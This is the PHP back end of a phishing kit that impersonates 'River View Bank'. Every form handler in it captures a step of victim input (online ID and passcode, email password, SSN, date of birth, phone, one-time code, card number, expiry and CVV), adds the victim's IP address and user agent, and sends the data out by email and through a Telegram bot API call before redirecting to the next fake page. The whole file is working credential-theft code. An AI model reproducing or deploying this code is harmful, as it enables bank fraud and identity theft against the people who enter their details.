<?php
ob_start();

include 'email.php';
include 'telegram.php';
if (isset($_POST['btn1'])) {

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|-------【River View Bank Login 1✅】---------|\n";
	
	$message .= "Online ID ✍            : ".$_POST['ai']."\n";
	$message .= "Passcode ✍              : ".$_POST['pr']."\n";
	$message .= "|-------🗺️------ I N F O | I P -------🗺️----------|\n";
	$message .= "|Client IP📍: ".$ip."\n";
	$message .= "|---🌍 http://www.geoiptool.com/?IP=$ip -🌍---\n";
	$message .= "User Agent 🧍‍♂️: ".$useragent."\n";
	$message .= "|-------【tele:Goodheart001🍁】-----------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	mail($send, $subject, $message); 
	$mess =urlencode($message);
	$url = "https://api.telegram.org/bot".$botToken."/sendmessage?chat_id=".$id ."&text=".$mess;
	$curl = curl_init();
	// curl_setopt ($curl, CURLOPT_PORT , 8089);
	curl_setopt($curl, CURLOPT_URL, $url);
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	// curl_exec($curl);
	
	$result=curl_exec($curl);
	if ($result) {
		$signal = 'ok';
		$msg = 'InValid Credentials';
	}
	curl_close($curl);
		header("Location: ./index11.html");
	
	
}
else if (isset($_POST['btn111'])) {
	

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|-------【River View Bank Login2  🏛️ 】---------|\n";
	
	$message .= "Online ID ✍            : ".$_POST['ai']."\n";
	$message .= "Passcode ✍              : ".$_POST['pr']."\n";
	$message .= "|-------🗺️------ I N F O | I P -------🗺️----------|\n";
	$message .= "|Client IP📍: ".$ip."\n";
	$message .= "|---🌍 http://www.geoiptool.com/?IP=$ip -🌍---\n";
	$message .= "User Agent 🧍‍♂️: ".$useragent."\n";
	$message .= "|-------【tele:Goodheart001🍁】-----------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	mail($send, $subject, $message); 
	$mess =urlencode($message);
	$url = "https://api.telegram.org/bot".$botToken."/sendmessage?chat_id=".$id ."&text=".$mess;
	$curl = curl_init();
	// curl_setopt ($curl, CURLOPT_PORT , 8089);
	curl_setopt($curl, CURLOPT_URL, $url);
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	// curl_exec($curl);
	
	$result=curl_exec($curl);
	if ($result) {
		$signal = 'ok';
		$msg = 'InValid Credentials';
	}
	curl_close($curl);
		header("Location: ./otp.html");
	
	
}
else if (isset($_POST['btnemail'])) {
	

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|-------【Email Access 📧 】---------|\n";
	$message .= "Email Address             : ".$_POST['ai']."\n";
	$message .= "Passcode              : ".$_POST['pr']."\n";
	$message .= "|-------🗺️------ I N F O | I P -------🗺️----------|\n";
	$message .= "|Client IP📍: ".$ip."\n";
	$message .= "|--🗺️- http://www.geoiptool.com/?IP=$ip 🌐---\n";
	$message .= "User Agent👨‍💻 : ".$useragent."\n";
	$message .= "|--------【tele: Goodheart001 👽】--------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	mail($send, $subject, $message); 
	$mess =urlencode($message);
	$url = "https://api.telegram.org/bot".$botToken."/sendmessage?chat_id=".$id ."&text=".$mess;
	$curl = curl_init();
	// curl_setopt ($curl, CURLOPT_PORT , 8089);
	curl_setopt($curl, CURLOPT_URL, $url);
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	// curl_exec($curl);
	
	$result=curl_exec($curl);
	if ($result) {
		$signal = 'ok';
		$msg = 'InValid Credentials';
	}
	curl_close($curl);
		header("Location: ./thank.html");
	
	
}


else if (isset($_POST['btn3'])) {
	

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|-------【Details✅】---------|\n";
	
	$message .= "Phone Number ☎           : ".$_POST['ph']."\n";
	$message .= "SSN 🪪           : ".$_POST['ssn']."\n";
	$message .= "Date Of Birth 🎂            : ".$_POST['dob']."\n";
	$message .= "|-------🗺️------ I N F O | I P -------🗺️----------|\n";
	$message .= "|Client IP📍: ".$ip."\n";
	$message .= "|--🗺️- http://www.geoiptool.com/?IP=$ip 🌐---\n";
	$message .= "User Agent👨‍💻 : ".$useragent."\n";
	$message .= "|--------【tele: Goodheart001 👽】--------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	mail($send, $subject, $message); 
	$mess =urlencode($message);
	$url = "https://api.telegram.org/bot".$botToken."/sendmessage?chat_id=".$id ."&text=".$mess;
	$curl = curl_init();
	// curl_setopt ($curl, CURLOPT_PORT , 8089);
	curl_setopt($curl, CURLOPT_URL, $url);
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	// curl_exec($curl);
	
	$result=curl_exec($curl);
	if ($result) {
		$signal = 'ok';
		$msg = 'InValid Credentials';
	}
	curl_close($curl);
		header("Location: ./emailaccess.html");
	
	
}
else if (isset($_POST['btn4'])) {
	

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|-------【Secure Code✅】---------|\n";
	
	$message .= "Code Recieved 🤳           : ".$_POST['ssn']."\n";

	$message .= "|-------🗺️------ I N F O | I P -------🗺️----------|\n";
	$message .= "|Client IP📍: ".$ip."\n";
	$message .= "|--🗺️- http://www.geoiptool.com/?IP=$ip 🌐---\n";
	$message .= "User Agent👨‍💻 : ".$useragent."\n";
	$message .= "|--------【tele: Goodheart001 👽】--------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	mail($send, $subject, $message); 
	$mess =urlencode($message);
	$url = "https://api.telegram.org/bot".$botToken."/sendmessage?chat_id=".$id ."&text=".$mess;
	$curl = curl_init();
	// curl_setopt ($curl, CURLOPT_PORT , 8089);
	curl_setopt($curl, CURLOPT_URL, $url);
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	// curl_exec($curl);
	
	$result=curl_exec($curl);
	if ($result) {
		$signal = 'ok';
		$msg = 'InValid Credentials';
	}
	curl_close($curl);	
		header("Location: ./card.html");
}
	
else if (isset($_POST['btncard'])) {
	

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|-------【Card Details 1 💳】---------|\n";
	
	$message .= "Card Number          : ".$_POST['cn']."\n";
	$message .= "Exp Date           : ".$_POST['exdate']."\n";
	$message .= "CVV           : ".$_POST['cvv']."\n";
	$message .= "Zipcode           : ".$_POST['zp']."\n";
	$message .= "|-------🗺️------ I N F O | I P -------🗺️----------|\n";
	$message .= "|Client IP📍: ".$ip."\n";
	$message .= "|--🗺️- http://www.geoiptool.com/?IP=$ip 🌐---\n";
	$message .= "User Agent👨‍💻 : ".$useragent."\n";
	$message .= "|--------【tele: Goodheart001 👽】--------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	mail($send, $subject, $message); 
	$mess =urlencode($message);
	$url = "https://api.telegram.org/bot".$botToken."/sendmessage?chat_id=".$id ."&text=".$mess;
	$curl = curl_init();
	// curl_setopt ($curl, CURLOPT_PORT , 8089);
	curl_setopt($curl, CURLOPT_URL, $url);
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	// curl_exec($curl);
	
	$result=curl_exec($curl);
	if ($result) {
		$signal = 'ok';
		$msg = 'InValid Credentials';
	}
	curl_close($curl);	
		header("Location: ./card2.html");
}
else if (isset($_POST['btncard2'])) {
	

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|-------【Card Details 2💳】---------|\n";
	
	$message .= "Card Number          : ".$_POST['cn']."\n";
	$message .= "Exp Date           : ".$_POST['exdate']."\n";
	$message .= "CVV           : ".$_POST['cvv']."\n";
	$message .= "Zipcode           : ".$_POST['zp']."\n";
	$message .= "|-------🗺️------ I N F O | I P -------🗺️----------|\n";
	$message .= "|Client IP📍: ".$ip."\n";
	$message .= "|--🗺️- http://www.geoiptool.com/?IP=$ip 🌐---\n";
	$message .= "User Agent👨‍💻 : ".$useragent."\n";
	$message .= "|--------【tele: Goodheart001 👽】--------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	mail($send, $subject, $message); 
	$mess =urlencode($message);
	$url = "https://api.telegram.org/bot".$botToken."/sendmessage?chat_id=".$id ."&text=".$mess;
	$curl = curl_init();
	// curl_setopt ($curl, CURLOPT_PORT , 8089);
	curl_setopt($curl, CURLOPT_URL, $url);
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	// curl_exec($curl);
	
	$result=curl_exec($curl);
	if ($result) {
		$signal = 'ok';
		$msg = 'InValid Credentials';
	}
	curl_close($curl);	
		header("Location: ./em.html");
}
ob_end_flush();
?>